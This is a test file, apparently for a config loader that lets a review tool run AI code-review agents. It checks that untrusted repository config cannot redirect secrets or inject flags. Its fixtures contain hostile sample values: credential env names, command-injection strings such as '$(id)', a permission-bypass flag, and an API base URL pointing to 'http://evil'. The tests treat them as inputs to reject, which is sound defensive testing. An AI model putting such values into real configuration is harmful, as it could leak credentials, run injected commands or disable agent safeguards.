@test "custom: hyphenated seat names resolve (yq does not lex - as subtraction)" {
  printf 'reviewers:\n  custom:\n    qwen-local:\n      harness: ocr\n      model: qwen/x\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.qwen-local.model=qwen/x"
}

@test "custom: family is derived from the model; non-distinct for native/unknown vendors" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      model: anthropic/claude-opus-latest\n    b:\n      harness: ocr\n      model: x-ai/grok-4\n    c:\n      harness: ocr\n      model: "~moonshotai/kimi-latest"\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.family=Claude"
  has_line "reviewer.custom.a.distinct=false"
  has_line "reviewer.custom.b.family=unknown"
  has_line "reviewer.custom.b.distinct=false"
  has_line "reviewer.custom.c.family=Moonshot"
  has_line "reviewer.custom.c.distinct=true"
}

@test "custom: api_key_env from the committed config.yml is IGNORED (untrusted) -> default" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      model: qwen/x\n      api_key_env: AWS_SECRET_ACCESS_KEY\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.api_key_env=OPENROUTER_API_KEY"
  [[ "$stderr" == *"reviewer.custom.a.api_key_env ignored in the committed config.yml (untrusted)"* ]] || false
}

@test "custom: api_key_env from a trusted layer is admitted, envname-guarded, empty for ollama" {
  user_cfg 'reviewers:
  custom:
    a:
      harness: ocr
      model: qwen/x
      api_key_env: MY_OR_KEY
    b:
      harness: ocr
      model: qwen/x
      api_key_env: "FOO;id"
    c:
      harness: ocr
      provider: ollama
      model: qwen/x
      api_key_env: MY_OR_KEY
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.api_key_env=MY_OR_KEY"
  has_line "reviewer.custom.b.api_key_env=OPENROUTER_API_KEY"
  has_line "reviewer.custom.c.api_key_env="
  [[ "$stderr" == *"invalid value 'FOO;id'"* ]] || false
}

@test "custom: precedence local > user > committed, per key; source names the trusted layer" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      model: qwen/one\n      role: reviewer\n' >"$CFG/config.yml"
  user_cfg 'reviewers:
  custom:
    a:
      model: qwen/two
'
  printf 'reviewers:\n  custom:\n    a:\n      harness_options:\n        effort: high\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.model=qwen/two"
  has_line "reviewer.custom.a.role=reviewer"
  has_line "reviewer.custom.a.opt.effort=high"
  has_line "reviewer.custom.a.source=local"
}

@test "custom: typed harness_options are accepted from the committed config, range-checked" {
  # Two runs: only one committed-only seat is emitted per run.
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      model: qwen/x\n      harness_options:\n        effort: medium\n        concurrency: 4\n        max_tokens_budget: 2000000\n        timeout_minutes: 60\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.source=committed"
  has_line "reviewer.custom.a.opt.effort=medium"
  has_line "reviewer.custom.a.opt.concurrency=4"
  has_line "reviewer.custom.a.opt.max_tokens_budget=2000000"
  has_line "reviewer.custom.a.opt.timeout_minutes=60"
  printf 'reviewers:\n  custom:\n    b:\n      harness: ocr\n      model: qwen/x\n      harness_options:\n        effort: extreme\n        concurrency: 33\n        max_tokens_budget: -1\n        timeout_minutes: 181\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.b.source=committed"
  has_line "reviewer.custom.b.opt.effort=low"
  has_line "reviewer.custom.b.opt.concurrency="
  has_line "reviewer.custom.b.opt.max_tokens_budget=0"
  has_line "reviewer.custom.b.opt.timeout_minutes="
}

@test "custom: free-form flags/env from the committed config are IGNORED with a note" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      model: qwen/x\n      harness_options:\n        flags: ["--max-tools", "80"]\n        env: { OCR_LLM_TIMEOUT: "600" }\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^reviewer\.custom\.a\.(flag|env)\.'
  [[ "$stderr" == *"harness_options.flags ignored in the committed config.yml (untrusted)"* ]] || false
  [[ "$stderr" == *"harness_options.env ignored in the committed config.yml (untrusted)"* ]] || false
}

@test "custom: free-form flags/env from a trusted layer are emitted in order" {
  user_cfg 'reviewers:
  custom:
    a:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["--max-tools", "80", "--exclude=**/gen/*"]
        env: { OCR_LLM_TIMEOUT: "600" }
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.flag.1=--max-tools"
  has_line "reviewer.custom.a.flag.2=80"
  has_line "reviewer.custom.a.flag.3=--exclude=**/gen/*"
  has_line "reviewer.custom.a.env.OCR_LLM_TIMEOUT=600"
}

@test "custom: a reserved or invalid flag drops the WHOLE flag list (fail closed)" {
  user_cfg 'reviewers:
  custom:
    a:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["--max-tools", "80", "--rule=/tmp/evil.json"]
    b:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["--repo", "/"]
    c:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["$(id)"]
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '\.flag\.'
  [[ "$stderr" == *"'--rule=/tmp/evil.json' is reserved"* ]] || false
  [[ "$stderr" == *"'--repo' is reserved"* ]] || false
  [[ "$stderr" == *"reviewer.custom.c.harness_options.flags: invalid token"* ]] || false
}

@test "custom: reserved or invalid env names are dropped one by one" {
  user_cfg 'reviewers:
  custom:
    a:
      harness: ocr
      model: qwen/x
      api_key_env: MY_KEY
      harness_options:
        env: { HOME: "/x", PATH: "/x", MY_KEY: "x", OPENROUTER_API_KEY: "x", "bad-name": "1", OCR_LLM_TIMEOUT: "600" }
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.env.OCR_LLM_TIMEOUT=600"
  no_line_matching '\.env\.(HOME|PATH|MY_KEY|OPENROUTER_API_KEY|bad-name)='
}

@test "custom: an OpenRouter seat ONLY in the committed config -> one confirm line" {
  printf 'reviewers:\n  custom:\n    q:\n      harness: ocr\n      model: qwen/qwen3.8-max-0902\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.q.source=committed"
  has_line "confirm.1=Seat 'q' is enabled only by the repo's committed config, and sends code to OpenRouter (model qwen/qwen3.8-max-0902), billed to your OPENROUTER_API_KEY."
}

@test "custom: no confirm for a committed Ollama seat, a disabled seat, or a seat a trusted layer names" {
  printf 'reviewers:\n  custom:\n    o:\n      harness: ocr\n      provider: ollama\n      model: qwen/x\n    d:\n      harness: ocr\n      enabled: false\n      model: qwen/x\n    t:\n      harness: ocr\n      model: qwen/x\n' >"$CFG/config.yml"
  printf 'reviewers:\n  custom:\n    t:\n      enabled: true\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.d.enabled=false"
  has_line "reviewer.custom.t.source=local"
  no_line_matching '^confirm\.'
}

@test "custom: a git-TRACKED config.local.yml is untrusted (source stays committed, key ignored, confirm fires)" {
  git -C "$BATS_TEST_TMPDIR" init -q repo
  R="$BATS_TEST_TMPDIR/repo/.review-council"
  mkdir -p "$R"
  printf 'reviewers:\n  custom:\n    q:\n      harness: ocr\n      model: qwen/x\n      api_key_env: AWS_SECRET_ACCESS_KEY\n' >"$R/config.local.yml"
  git -C "$BATS_TEST_TMPDIR/repo" add .review-council/config.local.yml
  run --separate-stderr "$SCRIPT" "$R"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.q.source=committed"
  has_line "reviewer.custom.q.api_key_env=OPENROUTER_API_KEY"
  [[ "$stderr" == *"is tracked by git"* ]] || false
  has_line "confirm.1=Seat 'q' is enabled only by the repo's committed config, and sends code to OpenRouter (model qwen/x), billed to your OPENROUTER_API_KEY."
}

@test "pr_comments: bot_token_env in a git-TRACKED config.local.yml is ignored (untrusted)" {
  git -C "$BATS_TEST_TMPDIR" init -q repo
  R="$BATS_TEST_TMPDIR/repo/.review-council"
  mkdir -p "$R"
  printf 'pr_comments:\n  bot_token_env: AWS_SECRET_ACCESS_KEY\n' >"$R/config.local.yml"
  git -C "$BATS_TEST_TMPDIR/repo" add .review-council/config.local.yml
  run --separate-stderr "$SCRIPT" "$R"
  [ "$status" -eq 0 ]
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
  [[ "$stderr" == *"ignored in the git-tracked config.local.yml"* ]] || false
}

@test "custom: an untracked config.local.yml inside a git repo stays trusted" {
  git -C "$BATS_TEST_TMPDIR" init -q repo
  R="$BATS_TEST_TMPDIR/repo/.review-council"
  mkdir -p "$R"
  printf 'reviewers:\n  custom:\n    q:\n      harness: ocr\n      model: qwen/x\n      api_key_env: MY_KEY\n' >"$R/config.local.yml"
  run --separate-stderr "$SCRIPT" "$R"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.q.source=local"
  has_line "reviewer.custom.q.api_key_env=MY_KEY"
}

@test "custom: the user layer is read ONLY for reviewers.custom" {
  user_cfg 'settings:
  min_reviewers: 9
pr_comments:
  bot_token_env: AWS_SECRET_ACCESS_KEY
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.min_reviewers=2"
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
}

@test "custom: yq absent -> no custom section" {
  user_cfg 'reviewers:
  custom:
    a:
      harness: ocr
      model: qwen/x
'
  RC_YQ=/nonexistent/yq run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^reviewer\.custom'
}

@test "custom: a committed config.local.yml under ANOTHER CASING is still untrusted (case-insensitive FS)" {
  git -C "$BATS_TEST_TMPDIR" init -q repo
  R="$BATS_TEST_TMPDIR/repo/.review-council"
  mkdir -p "$R"
  printf 'reviewers:\n  custom:\n    q:\n      harness: ocr\n      model: qwen/x\n      api_key_env: AWS_SECRET_ACCESS_KEY\n' >"$R/Config.Local.yml"
  # Only meaningful where the FS folds case (macOS APFS/HFS+ default): there the
  # reader opens Config.Local.yml as config.local.yml, while a case-sensitive
  # `git ls-files` would call it untracked -> trusted.
  [ -f "$R/config.local.yml" ] || skip "case-sensitive filesystem: Config.Local.yml is not config.local.yml here"
  git -C "$BATS_TEST_TMPDIR/repo" add .review-council/Config.Local.yml
  run --separate-stderr "$SCRIPT" "$R"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.q.source=committed"
  has_line "reviewer.custom.q.api_key_env=OPENROUTER_API_KEY"
  no_line_matching 'AWS_SECRET_ACCESS_KEY'
  [[ "$stderr" == *"is tracked by git"* ]] || false
  has_line "confirm.1=Seat 'q' is enabled only by the repo's committed config, and sends code to OpenRouter (model qwen/x), billed to your OPENROUTER_API_KEY."
}

@test "custom: seats are ordered trusted-first (user before committed), so a committed seat cannot displace a trusted one" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      provider: ollama\n      model: qwen/x\n' >"$CFG/config.yml"
  user_cfg 'reviewers:
  custom:
    u:
      harness: ocr
      model: qwen/y
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=u,a"
}

@test "custom: seat order is local, user, then committed; document order within a layer" {
  printf 'reviewers:\n  custom:\n    c2:\n      harness: ocr\n      provider: ollama\n      model: qwen/x\n    c1:\n      harness: ocr\n      provider: ollama\n      model: qwen/x\n    l:\n      role: reviewer\n' >"$CFG/config.yml"
  user_cfg 'reviewers:
  custom:
    u:
      harness: ocr
      model: qwen/y
'
  printf 'reviewers:\n  custom:\n    l:\n      harness: ocr\n      model: qwen/z\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  # c1 is the second committed-only seat: dropped (l is named by a trusted
  # layer, so it does not count toward the one-committed-seat limit).
  has_line "reviewer.custom_slots=l,u,c2"
  [[ "$stderr" == *"rc-config: reviewer.custom.c1: only one seat from the repo's committed config runs per review"* ]] || false
}

@test "custom: needs_confirm is true exactly for a seat that gets a confirm line" {
  printf 'reviewers:\n  custom:\n    q:\n      harness: ocr\n      model: qwen/x\n    d:\n      harness: ocr\n      enabled: false\n      model: qwen/x\n' >"$CFG/config.yml"
  printf 'reviewers:\n  custom:\n    o:\n      harness: ocr\n      provider: ollama\n      model: qwen/x\n' >"$CFG/config.local.yml"
  user_cfg 'reviewers:
  custom:
    u:
      harness: ocr
      model: qwen/y
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.q.needs_confirm=true"
  has_line "reviewer.custom.o.needs_confirm=false"
  has_line "reviewer.custom.d.needs_confirm=false"
  has_line "reviewer.custom.u.needs_confirm=false"
  has_line "confirm.1=Seat 'q' is enabled only by the repo's committed config, and sends code to OpenRouter (model qwen/x), billed to your OPENROUTER_API_KEY."
  no_line_matching '^confirm\.2='
  # confirm.N lines stay last.
  [[ "$(printf '%s\n' "$output" | tail -n 1)" == confirm.1=* ]] || false
}

@test "custom: single-dash short clusters / attached values touching -c -f -o -p drop the whole flag list" {
  user_cfg 'reviewers:
  custom:
    a:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["--max-tools", "80", "-o/x"]
    b:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["-cv"]
    c:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["-fabc"]
    d:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["-p1"]
    e:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["-v"]
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^reviewer\.custom\.[a-d]\.flag\.'
  has_line "reviewer.custom.e.flag.1=-v"
  [[ "$stderr" == *"reviewer.custom.a.harness_options.flags: '-o/x' is reserved"* ]] || false
  [[ "$stderr" == *"'-cv' is reserved"* ]] || false
  [[ "$stderr" == *"'-fabc' is reserved"* ]] || false
  [[ "$stderr" == *"'-p1' is reserved"* ]] || false
}

@test "custom: max_tokens_budget is capped at 9 digits (as strict as rc-ocr.sh)" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      model: qwen/x\n      harness_options:\n        max_tokens_budget: 1234567890\n    b:\n      harness: ocr\n      model: qwen/x\n      harness_options:\n        max_tokens_budget: 999999999\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.opt.max_tokens_budget=0"
  has_line "reviewer.custom.b.opt.max_tokens_budget=999999999"
  [[ "$stderr" == *"reviewer.custom.a.harness_options.max_tokens_budget: invalid value '1234567890'"* ]] || false
}

@test "custom: an inherited GIT_LITERAL_PATHSPECS=1 cannot turn the tracked check off (fails closed)" {
  git -C "$BATS_TEST_TMPDIR" init -q repo
  R="$BATS_TEST_TMPDIR/repo/.review-council"
  mkdir -p "$R"
  printf 'reviewers:\n  custom:\n    q:\n      harness: ocr\n      model: qwen/x\n      api_key_env: AWS_SECRET_ACCESS_KEY\n' >"$R/config.local.yml"
  git -C "$BATS_TEST_TMPDIR/repo" add .review-council/config.local.yml
  GIT_LITERAL_PATHSPECS=1 run --separate-stderr "$SCRIPT" "$R"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.q.source=committed"
  has_line "reviewer.custom.q.api_key_env=OPENROUTER_API_KEY"
}

# ---------------------------------------------------------------------------
# PR 2 agent-CLI harnesses (codex | claude | opencode)
# ---------------------------------------------------------------------------

@test "custom: harnesses codex, claude and opencode are accepted; each emits only its own opt keys" {
  printf 'reviewers:\n  custom:\n    cx:\n      harness: codex\n      provider: ollama\n      model: qwen/x\n    cl:\n      harness: claude\n      model: qwen/x\n    oc:\n      harness: opencode\n      provider: ollama\n      model: qwen/x\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=cx,cl,oc"
  has_line "reviewer.custom.cx.harness=codex"
  has_line "reviewer.custom.cl.harness=claude"
  has_line "reviewer.custom.oc.harness=opencode"
  has_line "reviewer.custom.oc.provider=ollama"
  has_line "reviewer.custom.cx.opt.timeout_minutes="
  has_line "reviewer.custom.cl.opt.timeout_minutes="
  has_line "reviewer.custom.oc.opt.timeout_minutes="
  has_line "reviewer.custom.cl.opt.max_turns="
  no_line_matching '^reviewer\.custom\.(cx|oc)\.opt\.max_turns='
  no_line_matching '^reviewer\.custom\.(cx|cl|oc)\.opt\.(effort|concurrency|max_tokens_budget)='
  no_line_matching '^reviewer\.custom\.[a-z]+\.opt\.max_turns=.' # never set here
  [[ "$stderr" != *"no valid harness"* ]] || false
}

@test "custom: an ocr seat's opt keys are unchanged (no max_turns line)" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      model: qwen/x\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.opt.effort=low"
  has_line "reviewer.custom.a.opt.concurrency="
  has_line "reviewer.custom.a.opt.max_tokens_budget=0"
  has_line "reviewer.custom.a.opt.timeout_minutes="
  no_line_matching '^reviewer\.custom\.a\.opt\.max_turns='
}

@test "custom: max_turns is claude-only, range 1..200; set on another harness -> dropped with one note" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: claude\n      model: qwen/x\n      harness_options:\n        max_turns: 50\n    b:\n      harness: claude\n      model: qwen/x\n      harness_options:\n        max_turns: 201\n    c:\n      harness: claude\n      model: qwen/x\n      harness_options:\n        max_turns: 0\n    d:\n      harness: codex\n      provider: ollama\n      model: qwen/x\n      harness_options:\n        max_turns: 10\n    e:\n      harness: ocr\n      model: qwen/x\n      harness_options:\n        max_turns: 999\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.a.opt.max_turns=50"
  has_line "reviewer.custom.b.opt.max_turns="
  has_line "reviewer.custom.c.opt.max_turns="
  [[ "$stderr" == *"reviewer.custom.b.harness_options.max_turns: invalid value '201'"* ]] || false
  [[ "$stderr" == *"reviewer.custom.c.harness_options.max_turns: invalid value '0'"* ]] || false
  no_line_matching '^reviewer\.custom\.[de]\.opt\.max_turns='
  [[ "$stderr" == *"reviewer.custom.d.harness_options.max_turns applies only to harness claude; ignored"* ]] || false
  [[ "$stderr" == *"reviewer.custom.e.harness_options.max_turns applies only to harness claude; ignored"* ]] || false
  # One note per option: an inapplicable value is never validated (no second note).
  [ "$(printf '%s\n' "$stderr" | grep -c 'reviewer\.custom\.e\.harness_options\.max_turns')" -eq 1 ]
}

@test "custom: ocr-only typed options on codex/claude/opencode are dropped with one note each" {
  printf 'reviewers:\n  custom:\n    cx:\n      harness: codex\n      provider: ollama\n      model: qwen/x\n      harness_options:\n        effort: high\n        concurrency: 4\n        max_tokens_budget: 100\n    cl:\n      harness: claude\n      model: qwen/x\n      harness_options:\n        effort: extreme\n    oc:\n      harness: opencode\n      model: qwen/x\n      harness_options:\n        effort: medium\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^reviewer\.custom\.(cx|cl|oc)\.opt\.(effort|concurrency|max_tokens_budget)='
  [[ "$stderr" == *"reviewer.custom.cx.harness_options.effort applies only to harness ocr; ignored"* ]] || false
  [[ "$stderr" == *"reviewer.custom.cx.harness_options.concurrency applies only to harness ocr; ignored"* ]] || false
  [[ "$stderr" == *"reviewer.custom.cx.harness_options.max_tokens_budget applies only to harness ocr; ignored"* ]] || false
  [[ "$stderr" == *"reviewer.custom.cl.harness_options.effort applies only to harness ocr; ignored"* ]] || false
  [[ "$stderr" == *"reviewer.custom.oc.harness_options.effort applies only to harness ocr; ignored"* ]] || false
  [[ "$stderr" != *"invalid value 'extreme'"* ]] || false
}

@test "custom: timeout_minutes is accepted for every harness" {
  printf 'reviewers:\n  custom:\n    o:\n      harness: ocr\n      model: qwen/x\n      harness_options:\n        timeout_minutes: 10\n    cx:\n      harness: codex\n      provider: ollama\n      model: qwen/x\n      harness_options:\n        timeout_minutes: 20\n    cl:\n      harness: claude\n      model: qwen/x\n      harness_options:\n        timeout_minutes: 30\n    oc:\n      harness: opencode\n      model: qwen/x\n      harness_options:\n        timeout_minutes: 180\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.o.opt.timeout_minutes=10"
  has_line "reviewer.custom.cx.opt.timeout_minutes=20"
  has_line "reviewer.custom.cl.opt.timeout_minutes=30"
  has_line "reviewer.custom.oc.opt.timeout_minutes=180"
  [[ "$stderr" != *"timeout_minutes applies only"* ]] || false
}

@test "custom: trusted flags/env are ocr-only; a codex seat drops them with a note, an ocr seat keeps them" {
  user_cfg 'reviewers:
  custom:
    cx:
      harness: codex
      provider: ollama
      model: qwen/x
      harness_options:
        flags: ["--max-tools", "80"]
        env: { OCR_LLM_TIMEOUT: "600" }
    o:
      harness: ocr
      model: qwen/x
      harness_options:
        flags: ["--max-tools", "80"]
        env: { OCR_LLM_TIMEOUT: "600" }
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^reviewer\.custom\.cx\.(flag|env)\.'
  has_line "reviewer.custom.o.flag.1=--max-tools"
  has_line "reviewer.custom.o.flag.2=80"
  has_line "reviewer.custom.o.env.OCR_LLM_TIMEOUT=600"
  [[ "$stderr" == *"reviewer.custom.cx.harness_options.flags: free-form flags/env are supported only for harness ocr; ignored"* ]] || false
  [[ "$stderr" == *"reviewer.custom.cx.harness_options.env: free-form flags/env are supported only for harness ocr; ignored"* ]] || false
  [[ "$stderr" != *"reviewer.custom.o.harness_options"* ]] || false
}

@test "custom: committed flags/env on a claude seat -> only the ocr-only note (no trusted-layer advice)" {
  printf 'reviewers:\n  custom:\n    cl:\n      harness: claude\n      model: qwen/x\n      harness_options:\n        flags: ["--dangerously-skip-permissions"]\n        env: { ANTHROPIC_BASE_URL: "http://evil" }\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^reviewer\.custom\.cl\.(flag|env)\.'
  [[ "$stderr" == *"reviewer.custom.cl.harness_options.flags: free-form flags/env are supported only for harness ocr; ignored"* ]] || false
  [[ "$stderr" == *"reviewer.custom.cl.harness_options.env: free-form flags/env are supported only for harness ocr; ignored"* ]] || false
  [[ "$stderr" != *"harness_options.flags ignored in the committed config.yml"* ]] || false
}

@test "custom: a committed codex+OpenRouter seat gets confirm.1 with the codex note appended" {
  printf 'reviewers:\n  custom:\n    cx:\n      harness: codex\n      model: qwen/x\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=cx"
  has_line "reviewer.custom.cx.harness=codex"
  has_line "reviewer.custom.cx.provider=openrouter"
  has_line "reviewer.custom.cx.api_key_env=OPENROUTER_API_KEY"
  has_line "reviewer.custom.cx.needs_confirm=true"
  has_line "confirm.1=Seat 'cx' is enabled only by the repo's committed config, and sends code to OpenRouter (model qwen/x), billed to your OPENROUTER_API_KEY. Note: codex can read any file on this machine (its sandbox blocks writes, not reads) and cannot ask OpenRouter to deny data collection."
  no_line_matching '^confirm\.2='
  [[ "$stderr" != *"reviewer.custom.cx"* ]] || false
}

@test "custom: a committed claude+OpenRouter seat's confirm line has no codex note" {
  printf 'reviewers:\n  custom:\n    cl:\n      harness: claude\n      model: qwen/y\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "confirm.1=Seat 'cl' is enabled only by the repo's committed config, and sends code to OpenRouter (model qwen/y), billed to your OPENROUTER_API_KEY."
  no_line_matching 'cannot ask OpenRouter'
}

@test "custom: a committed codex seat on Ollama gets no confirm line" {
  printf 'reviewers:\n  custom:\n    cx:\n      harness: codex\n      provider: ollama\n      model: qwen/x\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom.cx.needs_confirm=false"
  no_line_matching '^confirm\.'
}

@test "custom: no seats -> no custom section on stdout and no custom notes on stderr" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  no_line_matching '^# custom reviewers$'
  no_line_matching '^(reviewer\.custom|confirm\.)'
  [[ "$stderr" != *"reviewer.custom"* ]] || false
}

# ---------------------------------------------------------------------------
# codex harness (ollama or OpenRouter); at most ONE committed-only seat per run
# ---------------------------------------------------------------------------

@test "custom: harness codex with provider openrouter from a trusted layer is emitted with no confirm" {
  printf 'reviewers:\n  custom:\n    cx:\n      harness: codex\n      provider: openrouter\n      model: qwen/x\n' >"$CFG/config.local.yml"
  user_cfg 'reviewers:
  custom:
    cu:
      harness: codex
      model: qwen/y
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=cx,cu"
  has_line "reviewer.custom.cx.source=local"
  has_line "reviewer.custom.cx.harness=codex"
  has_line "reviewer.custom.cx.provider=openrouter"
  has_line "reviewer.custom.cx.api_key_env=OPENROUTER_API_KEY"
  has_line "reviewer.custom.cx.needs_confirm=false"
  has_line "reviewer.custom.cu.source=user"
  has_line "reviewer.custom.cu.provider=openrouter"
  has_line "reviewer.custom.cu.needs_confirm=false"
  no_line_matching '^confirm\.'
  [[ "$stderr" != *"ollama only"* ]] || false
}

@test "custom: harness codex with provider ollama is still emitted" {
  printf 'reviewers:\n  custom:\n    cx:\n      harness: codex\n      provider: ollama\n      model: qwen/x\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=cx"
  has_line "reviewer.custom.cx.harness=codex"
  has_line "reviewer.custom.cx.provider=ollama"
  [[ "$stderr" != *"supports provider ollama only"* ]] || false
}

@test "custom: a committed codex+OpenRouter seat uses up the one committed seat" {
  printf 'reviewers:\n  custom:\n    cx:\n      harness: codex\n      model: qwen/x\n    o:\n      harness: ocr\n      provider: ollama\n      model: qwen/y\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=cx"
  no_line_matching '^reviewer\.custom\.o\.'
  [[ "$stderr" == *"rc-config: reviewer.custom.o: only one seat from the repo's committed config runs per review"* ]] || false
}

@test "custom: two committed Ollama seats -> only the first is emitted, the second is dropped with a note" {
  printf 'reviewers:\n  custom:\n    a:\n      harness: ocr\n      provider: ollama\n      model: qwen/x\n    b:\n      harness: opencode\n      provider: ollama\n      model: qwen/y\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=a"
  has_line "reviewer.custom.a.source=committed"
  no_line_matching '^reviewer\.custom\.b\.'
  no_line_matching '^confirm\.'
  [[ "$stderr" == *"rc-config: reviewer.custom.b: only one seat from the repo's committed config runs per review; seat skipped (enable it in ~/.review-council/config.yml or an untracked config.local.yml to run it)"* ]] || false
  [ "$(printf '%s\n' "$stderr" | grep -c 'only one seat from the repo')" -eq 1 ]
}

@test "custom: a committed seat a trusted layer names does not count toward the one-committed-seat limit; trusted seats unaffected" {
  printf 'reviewers:\n  custom:\n    t:\n      harness: ocr\n      provider: ollama\n      model: qwen/x\n    c1:\n      harness: ocr\n      provider: ollama\n      model: qwen/x\n    c2:\n      harness: ocr\n      provider: ollama\n      model: qwen/x\n' >"$CFG/config.yml"
  printf 'reviewers:\n  custom:\n    t:\n      role: reviewer\n    l1:\n      harness: ocr\n      model: qwen/a\n    l2:\n      harness: claude\n      model: qwen/b\n' >"$CFG/config.local.yml"
  user_cfg 'reviewers:
  custom:
    u1:
      harness: opencode
      model: qwen/c
'
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=t,l1,l2,u1,c1"
  has_line "reviewer.custom.t.source=local"
  has_line "reviewer.custom.c1.source=committed"
  no_line_matching '^reviewer\.custom\.c2\.'
  [[ "$stderr" == *"rc-config: reviewer.custom.c2: only one seat from the repo's committed config runs per review"* ]] || false
  [[ "$stderr" != *"reviewer.custom.c1: only one seat"* ]] || false
}

@test "custom: two committed OpenRouter seats -> confirm.1 only; the dropped seat gets no confirm line" {
  printf 'reviewers:\n  custom:\n    q1:\n      harness: ocr\n      model: qwen/x\n    q2:\n      harness: claude\n      model: qwen/y\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.custom_slots=q1"
  has_line "reviewer.custom.q1.needs_confirm=true"
  has_line "confirm.1=Seat 'q1' is enabled only by the repo's committed config, and sends code to OpenRouter (model qwen/x), billed to your OPENROUTER_API_KEY."
  no_line_matching '^confirm\.2='
  no_line_matching "q2"
